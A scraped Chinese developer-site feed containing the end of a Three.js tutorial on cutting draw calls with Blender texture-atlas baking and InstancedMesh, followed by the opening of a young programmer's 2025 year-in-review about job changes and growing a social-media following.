<p>重复操作直到所有材质（我这里是14个）都连上了Atlas图像。看这里的数字，显示14就代表14个材质共享这张贴图：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c5ce0ee6cc84071baf6c4f84691ccd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=lM0TTtMf7%2FKj2gKU%2Bj0mFxxYIUQ%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>切换到<code>Render Properties</code>面板，选择<code>Cycles</code>渲染器，烘焙类型选<code>Combined</code>（有金属材质）或<code>Diffuse</code>（纯漫反射，贴图更小）</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d4677607c724632b104ebe886fc3710~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=ue33E4Bml1XcwDM5DvkygdxaTbA%3D" alt="image.png" loading="lazy"/></p>
<p>等进度条走完，得到一张合并了14种材质的贴图：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7e6e3d796044d28b60e67931ecae739~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=IR7a1e6t%2ByWVmuXF9q2Im8%2B6BGM%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-5">5. 清理材质</h3>
<p>把之前的14个材质都删了，只保留一个使用Atlas贴图的材质：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48023a19a9144c088e9b7bb4ef88aae7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=HZmHqF1wc4O8h3nJNqF4m8hiYiQ%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/777b7b7e836d452186b78e4ceb70921c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=yHfgxcNPjQqkGcnH%2F%2BmkXuyeuzE%3D" alt="image.png" loading="lazy"/></p>
<p>导出模型，替换到场景看看效果：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79a90f54844a47158ac3960535c0a80f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=XBB%2Fpy735EmavOXyF2BiohK77mk%3D" alt="threejs-test - Google Chrome 2026-02-03 22-53-17.gif" loading="lazy"/></p>
<p><strong>见证奇迹！</strong> DrawCall从52000降到了200次，帧率从个位数回升到30+。这是因为CPU不用再疯狂提交绘制指令了，但200次DrawCall还是有点多，毕竟我们追求的是draw call为1的极致丝滑~。</p>
<h2 data-id="heading-6">第二步：InstancedMesh 终极优化</h2>
<p>现在要祭出大杀器了。<strong>注意：这个方法只适用于200个设备是相同模型的情况！</strong> 如果是200种不同的设备（比如有空调、有变压器、有配电柜），请看文章末尾的"方案局限与替代方案"。</p>
<p>现在我们的模型只有1个Mesh+1个材质，完美符合InstancedMesh的条件。把200次DrawCall压到1次：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76ab427fda18469b9613b9d134edf5ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-25pm66L69:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769571&amp;x-signature=DzslCJ54Gvs7APseh2m93m5rKm0%3D" alt="threejs-test - Google Chrome 2026-02-03 23-02-12.gif" loading="lazy"/></p>
<p><strong>200个设备，52000次DrawCall → 1次DrawCall！</strong> GPU通过硬件实例化特性，一次指令批量渲染200个副本，CPU终于解放了。</p>
<p>至于帧率为什么和200次DrawCall时差不多，是因为测试机的GPU顶点处理或像素填充到了瓶颈（我这里就是因为GPU满载了）。</p>
<p>但在低端设备或更复杂场景下，减少DrawCall的收益肯定会非常明显滴~。</p>
<p>以下是完整代码（带资源释放和差异化颜色）：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ---------- 加载 GLB，使用 InstancedMesh 批量渲染 ----------</span>
<span class="hljs-keyword">const</span> cols = <span class="hljs-number">10</span>;
<span class="hljs-keyword">const</span> rows = <span class="hljs-number">20</span>;
<span class="hljs-keyword">const</span> totalCount = cols * rows;
<span class="hljs-keyword">const</span> spacing = <span class="hljs-number">1.3</span>;
<span class="hljs-keyword">const</span> glbPath = <span class="hljs-string">'/v6.glb'</span>;
<span class="hljs-keyword">const</span> loader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GLTFLoader</span>();

loader.<span class="hljs-title function_">load</span>(glbPath, <span class="hljs-function">(<span class="hljs-params">gltf</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> model = gltf.<span class="hljs-property">scene</span>;

  <span class="hljs-comment">// 根据模型尺寸计算缩放</span>
  <span class="hljs-keyword">const</span> box = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Box3</span>().<span class="hljs-title function_">setFromObject</span>(model);
  <span class="hljs-keyword">const</span> size = box.<span class="hljs-title function_">getSize</span>(<span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>());
  <span class="hljs-keyword">const</span> maxDim = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(size.<span class="hljs-property">x</span>, size.<span class="hljs-property">y</span>, size.<span class="hljs-property">z</span>, <span class="hljs-number">0.001</span>);
  <span class="hljs-keyword">const</span> scale = <span class="hljs-number">0.6</span> / maxDim;

  <span class="hljs-comment">// 提取第一个Mesh作为实例模板（合并后的模型应该只有一个Mesh）</span>
  <span class="hljs-keyword">let</span> baseMesh = <span class="hljs-literal">null</span>;
  model.<span class="hljs-title function_">traverse</span>(<span class="hljs-function">(<span class="hljs-params">obj</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (obj.<span class="hljs-property">isMesh</span>) {
      obj.<span class="hljs-property">castShadow</span> = obj.<span class="hljs-property">receiveShadow</span> = <span class="hljs-literal">true</span>;
      <span class="hljs-keyword">if</span> (!baseMesh) baseMesh = obj;
    }
  });

  <span class="hljs-keyword">if</span> (!baseMesh) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'GLB 中未找到 Mesh，无法创建 InstancedMesh'</span>);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// 克隆几何体和材质（防止影响原模型）</span>
  <span class="hljs-keyword">const</span> geometry = baseMesh.<span class="hljs-property">geometry</span>.<span class="hljs-title function_">clone</span>();
  
  <span class="hljs-comment">// 防御性处理：材质可能是数组</span>
  <span class="hljs-keyword">const</span> rawMaterial = baseMesh.<span class="hljs-property">material</span>;
  <span class="hljs-keyword">const</span> material = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(rawMaterial) 
    ? rawMaterial[<span class="hljs-number">0</span>].<span class="hljs-title function_">clone</span>() 
    : rawMaterial.<span class="hljs-title function_">clone</span>();

  <span class="hljs-comment">// 创建 InstancedMesh</span>
  <span class="hljs-keyword">const</span> instancedMesh = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">InstancedMesh</span>(geometry, material, totalCount);
  instancedMesh.<span class="hljs-property">castShadow</span> = <span class="hljs-literal">true</span>;
  instancedMesh.<span class="hljs-property">receiveShadow</span> = <span class="hljs-literal">true</span>;

  <span class="hljs-comment">// 获取原始模型的世界旋转，保持朝向一致</span>
  <span class="hljs-keyword">const</span> worldQuat = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Quaternion</span>();
  baseMesh.<span class="hljs-title function_">getWorldQuaternion</span>(worldQuat);

  <span class="hljs-keyword">const</span> dummy = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Object3D</span>();
  <span class="hljs-keyword">const</span> color = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Color</span>();
  <span class="hljs-keyword">let</span> idx = <span class="hljs-number">0</span>;
  
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; rows; i++) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; cols; j++) {
      <span class="hljs-comment">// 设置位置</span>
      dummy.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(
        (j - cols / <span class="hljs-number">2</span> + <span class="hljs-number">0.5</span>) * spacing,
        <span class="hljs-number">0</span>,
        (i - rows / <span class="hljs-number">2</span> + <span class="hljs-number">0.5</span>) * spacing
      );
      dummy.<span class="hljs-property">quaternion</span>.<span class="hljs-title function_">copy</span>(worldQuat);
      dummy.<span class="hljs-property">scale</span>.<span class="hljs-title function_">set</span>(scale, scale, scale);
      dummy.<span class="hljs-title function_">updateMatrix</span>();
      
      instancedMesh.<span class="hljs-title function_">setMatrixAt</span>(idx, dummy.<span class="hljs-property">matrix</span>);
      
      <span class="hljs-comment">// 示例：给不同设备设置不同颜色（比如根据运行状态）</span>
      <span class="hljs-comment">// 前100个绿色，后100个红色</span>
      <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">100</span>) {
        color.<span class="hljs-title function_">setHex</span>(<span class="hljs-number">0x00ff00</span>);
      } <span class="hljs-keyword">else</span> {
        color.<span class="hljs-title function_">setHex</span>(<span class="hljs-number">0xff0000</span>);
      }
      instancedMesh.<span class="hljs-title function_">setColorAt</span>(idx, color);
      
      idx++;
      <span class="hljs-keyword">if</span> (idx &gt;= totalCount) <span class="hljs-keyword">break</span>;
    }
    <span class="hljs-keyword">if</span> (idx &gt;= totalCount) <span class="hljs-keyword">break</span>;
  }
  
  instancedMesh.<span class="hljs-property">instanceMatrix</span>.<span class="hljs-property">needsUpdate</span> = <span class="hljs-literal">true</span>;
  instancedMesh.<span class="hljs-property">instanceColor</span>.<span class="hljs-property">needsUpdate</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 如果用了setColorAt，必须设置这个</span>
  scene.<span class="hljs-title function_">add</span>(instancedMesh);
  
  <span class="hljs-comment">// 释放原始模型占用的内存（很重要！）</span>
  model.<span class="hljs-title function_">traverse</span>(<span class="hljs-function">(<span class="hljs-params">obj</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (obj.<span class="hljs-property">isMesh</span>) {
      obj.<span class="hljs-property">geometry</span>.<span class="hljs-title function_">dispose</span>();
      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(obj.<span class="hljs-property">material</span>)) {
        obj.<span class="hljs-property">material</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> m.<span class="hljs-title function_">dispose</span>());
      } <span class="hljs-keyword">else</span> {
        obj.<span class="hljs-property">material</span>.<span class="hljs-title function_">dispose</span>();
      }
    }
  });
  
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`InstancedMesh 创建完成，共 <span class="hljs-subst">${totalCount}</span> 个实例，DrawCall: 1`</span>);
  
}, <span class="hljs-literal">undefined</span>, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'GLB 加载失败:'</span>, err));
</code></pre>
<h2 data-id="heading-7">⚠️ 重要：方案局限与替代方案</h2>
<p><strong>本文方案有两个硬前提：</strong></p>
<ol>
<li><strong>200个设备必须是相同几何体</strong>（一模一样的模型）</li>
<li><strong>经过烘焙后只剩下一个材质</strong>（或最多几个，但InstancedMesh要求同Geometry+同Material）</li>
</ol>
<p><strong>如果你的场景是200个不同的设备（不同型号、不同几何体）：</strong></p>
<ul>
<li><strong>BatchedMesh</strong>（Three.js r151+）：支持不同几何体合并绘制，但控制更复杂</li>
<li><strong>Merge Geometry</strong>：把多个不同几何体合并成一个大的BufferGeometry，适合静态场景（缺点是失去单个设备的控制能力，无法单独点击选中）</li>
<li><strong>LOD + Frustum Culling</strong>：远处设备降低精度，视野外设备不渲染</li>
<li><strong>按需加载</strong>：只渲染视野内的设备，配合Octree空间分割</li>
</ul>
<p><strong>关于交互：</strong>
如果需要点击选中某个设备，使用<code>raycaster.intersectObject(instancedMesh)</code>，通过<code>instanceId</code>属性知道点中了第几个实例，然后可以通过<code>getMatrixAt</code>获取其位置信息。</p>
<h2 data-id="heading-8">总结</h2>
<p>优化路径：<strong>52000 DrawCall（原始）→ 200 DrawCall（烘焙合并）→ 1 DrawCall（InstancedMesh）</strong></p>
<p>核心思路就是<strong>减少CPU向GPU发送绘制指令的次数</strong>。Blender负责把"多Mesh多材质"变成"单Mesh单材质"，InstancedMesh负责把"绘制200次"变成"绘制1次"。</p>
<p>如果你的场景也是大批量重复设备，试试这个方案，让你的帧率飞起来~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025总结：从应届生到全网20W粉，“稳定发疯”的一年]]></title>    <link>https://juejin.cn/post/7598023360732200970</link>    <guid>https://juejin.cn/post/7598023360732200970</guid>    <pubDate>2026-01-22T12:52:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7598023360732200970" data-draft-id="7598023360732184586" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025总结：从应届生到全网20W粉，“稳定发疯”的一年"/> <meta itemprop="keywords" content="代码规范"/> <meta itemprop="datePublished" content="2026-01-22T12:52:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序猿追"/> <meta itemprop="url" content="https://juejin.cn/user/1764043325192637"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025总结：从应届生到全网20W粉，“稳定发疯”的一年
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1764043325192637/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序猿追
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T12:52:52.000Z" title="Thu Jan 22 2026 12:52:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    35
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<h2 data-id="heading-0"><strong>一、2026年初的碎碎念</strong></h2>
<p>哈喽，各位观众老爷们大家好，我是追。</p>
<p>现在是2026年1月，深圳这边也开始降温了，趁着我的心还没有凉，谨以此文记录我的2025。</p>
<p>作为一个25届的应届生，回看刚过去的2025，总觉得跟做梦一样。虽然现在全网累积了20W粉丝，但老粉都知道，我从21年大一就开始做了。这20W粉，算是我跑了四年的一个交代。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36081ab442be4550ad8f4e874be09f68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=dK2mF7jVGb8jmVb4pdukz2kPihc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1"><strong>二、 年初坐标上海</strong></h2>
<p>2025年初那会儿，我整个人状态其实挺崩的，跟毕业生一样，在赶春招天天海投天天面试。最后总算拿到了上海一家上市车企的软件开发的offer，心里那块大石头才算落了地。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81c92a0bf3c84fafb2a9f12ba01b1d26~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=fkzU49qZO9ANxjM3itIFwL03TSI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>三、5月终章：毕设“入编”与第一场演唱会</strong></h2>
<p>5月份是毕业前最后的疯狂。我去看了人生第一场演唱会，在台下喊到嗓子哑掉。</p>
<p>回学校参加答辩也很顺利，拿到了“优秀毕业生”。最让我得意的，是我的毕设被学校相中，直接“入编”放在图书馆展览了。走的那天我还专门去看了看，心里乐着：这四年的学没白上，好歹给母校留了点东西。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5649c504cb9644abbecd3c1632827e0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=hl%2Fya0%2FULLFbmjiZId4nCO2QS2I%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3"><strong>四、7月转场：去深圳</strong></h2>
<p>7月本来该转正了，但因为一些说不清楚的因素（大家都懂，职场那点事），我选择了离职。当时没想太多，拎着行李箱就奔向了深圳。</p>
<p>事实证明，年轻人确实该多折腾。现在我在一家955的公司，不怎么加班，环境也自由。试用期还没过，老板就主动给我涨了工资，这种被肯定的感觉真的yyds。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e5eb10ede50435fa2e8d11f851c7533~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=vdd1O1Mf1z%2FZsNoRVypApHT0i74%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4"><strong>五、8月生活：烫了头，爬了山，找回了自己</strong></h2>
<p>8月份，我开始尝试一些以前没做过的事。和一群“狐朋狗友”去夜爬梧桐山，在山顶守了一夜看日出。</p>
<p>那阵子我也变了不少，买了很多合身的衣服，尝试了烫头（效果意外地非常满意）。不再只是为了某个目标去赶路，而是开始享受这种“鲜活”的感觉。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b05a78526b64445d91d2dedab9249d24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=8n49xJU9gMeCMb%2BHzPu6y3VLPWo%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5"><strong>六、9-12月：全平台开花，疯狂搞钱</strong></h2>
<p>9 月份，我把重心放到了小红书，结果半个月涨粉 2w+，直接变现了五位数，这给了我极大的底气。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bad43875e1c74f52b0645534ddddd74b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=JSz6HDJ7qHBHgKxLXHOXRTGTf1U%3D" alt="" loading="lazy"/></p>
<p>10 月奖励了自己一台影石 360，做抖音 vlog，虽然目前还没搞出什么名堂（hhh），但折腾的过程本身就很爽。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b0e6c27900049eea8a1c855109d1832~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=dYWiamMJbh%2BRZDtxJUTBjt6nK%2Bg%3D" alt="" loading="lazy"/></p>
<p>到了 11 月，我的 B 站粉丝也累计突破了 10w+，正在坐等小电视奖牌。期间我还收到了华为云、阿里云、腾讯云、极星会等一堆专家的荣誉证书。线下参加会议，跟各路技术大佬交流学习时，我才发现：原来我也能跟他们站在同一个频道上，外面的世界真精彩。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed5affdab3f7487b85736581ef5c079f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=vH3YY%2FC%2Bfiar1KG13mV5Y1d9Fm4%3D" alt="" loading="lazy"/></p>
<p>12 月，我又开启了得物等平台带货，进入一个全新的赛道。每天拆快递、测评样品成了常态，还意外收到了官方大大的感谢信。这一年收尾得比我想象中要精彩。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bf6720ab6854584b746a99ccc1fe3e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=3XxGyYoJRPgD91dol%2FPG4YzT6ew%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9e373bebe81470fbffad250017fb322~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=XxzR6YyvNfdTjs0swlNDdLmSQQI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6"><strong>七、关于自媒体与职场的 Q&amp;A</strong></h2>
<p><strong>问：为什么做这么多自媒体账号？</strong></p>
<p><strong>答：</strong> 在毕业之后三年内，我想在有稳定收入的情况下，去尝试不同的职业，去体验不同的酸甜苦辣，多学习自己之前没有接触过的行业知识与各个领域的大牛；例如，为了拍摄视频我学会了写视频脚本、剪映，为了拍摄vlog我专门找摄影大牛学习拍摄技巧，为了学习拍摄种草攻略，专门去学习电商知识（选品，投流……）等等。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3788158e555449db810eaadeaa43dda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=Abn7XRAqo47jcyLGP2rVFh7Ms%2Fg%3D" alt="" loading="lazy"/></p>
<p><strong>问：小红书半个月变现五位数，B站都十万粉了，为啥不干脆辞职全职做博主？</strong> <strong>答：</strong> 这个问题我每天都要问自己三遍（笑死我了）。但我现在才毕业第一年，我觉得社会这所“大学”我还没读明白。公司里那种处理复杂问题的逻辑、领导的思维方式，是家里那张办公桌给不了我的。现阶段，“打工”是我的底气，“自媒体”是我的底座，两条腿走路，步子比较稳，才能一步一个脚印，不容易拉胯。</p>
